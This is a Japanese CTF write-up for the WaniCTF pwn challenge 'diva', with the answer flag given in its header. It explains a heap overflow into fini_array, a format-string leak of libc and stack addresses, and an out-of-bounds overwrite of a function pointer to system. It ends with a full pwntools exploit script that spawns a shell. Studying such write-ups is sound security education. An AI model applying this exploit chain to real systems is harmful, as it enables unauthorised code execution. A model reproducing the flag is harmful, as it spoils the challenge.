---
title: diva
level: 5
flag: FLAG{in_this_dazzling_time}
writer: EBeb
badge: true
---

# DIVA

## 問題文

私の使命は歌でフラグを取ること

`nc diva.pwn.wanictf.org 9008`

HINT

- No RELRO vs Partial RELRO ?

## 解法


### Heap Overflow + FSB + OOB

#### STEP 1. 戻る
line 163 `read(0, textArea[i], 0x40);`にHeapOverflow -> fake chunkの生成が可能
しかし、適切な場所が分からない。

No RELRO & No PIE -> fini_arrayのあドレスが固定で書き換えれる。

ここをmainアドレスにalignを合わせて書き換えることでmainに戻ることができる。

mainでは最後に入力した命令が実行される。

#### STEP 2. 必要なアドレスをLeakさせる

命令はsing, erease writeがある。sing ereaseは関数Pointer配列で管理されている。

sing : 入力した歌詞を出力する。　-> Format String Bug line40

erease : 入力した歌詞を消す。

write :　歌詞を書く。 -> Out of Boundary line 62,63 
	Ereaseやparse varと比較したらBoundary checkがないのが確認できる。

singで必要なアドレスを取る。 
以下のSolverではlibcのアドレスとmain関数のretアドレスを取得

ここで任意の場所に読み込みと書き込みができるようになるため、以下の例は可能な方法中の一つである。

#### STEP 3. もう一度戻って得たLeakを用いてシェルを取得

1回目のループでリークを得てそれを使う2回目のループが必要。

mainのretをheap overflowを用いて書き換える。

writeのOut of Boundaryでfunction pointerのアドレスをsystemに書き換え
solverではsingを書き換える。

singのアドレスが現在Systemになっているため
`sing /bin/sh`



### Solverのコードと結果

```
from pwn import *

pc = connect('localhost',9008)
e = ELF('./chall')


fini_array = e.symbols['__init_array_start']+8

// overwrite fini_array and ready to get the memory leak

payload=b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbb'+p64(0)+p64(0x31)+p64(fini_array)
print(pc.recvuntil(b">"))
#gdb.attach(pc,'b sing')
pc.sendline(b'write %0 a-%10$p-%20$p')
pc.sendlineafter(b">",b'sing %0')
pc.sendlineafter(b">",b'sing %3')
pc.sendlineafter(b">",payload)
pc.sendlineafter(b">",b'payload')
pc.sendlineafter(b">",p64(e.symbols['main'])+p64(e.symbols['main']))
print(pc.recvuntil('🎵a-'))

//リーク情報から必要なアドレスを計算

system=int(pc.recvuntil('-')[:-1],16)-1973632
main_ret=int(pc.recvuntil('🎵')[:-4],16)+8
print(hex(system))
print(hex(main_ret))

//main_retを書き換えてfunction pointer arrayを書き換えてからsing

payload=b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbb'+p64(0)+p64(0x31)+p64(main_ret)
print(pc.recvuntil(b">"))
#gdb.attach(pc,'b sing')
pc.sendline(b'write %* '+p64(system))
pc.sendlineafter(b">",b'eaa')
pc.sendlineafter(b">",b'aaa')
pc.sendlineafter(b">",payload)
pc.sendlineafter(b">",b'sing /bin/sh')
pc.sendlineafter(b">",p64(e.symbols['main']+5))
pc.interactive()
```
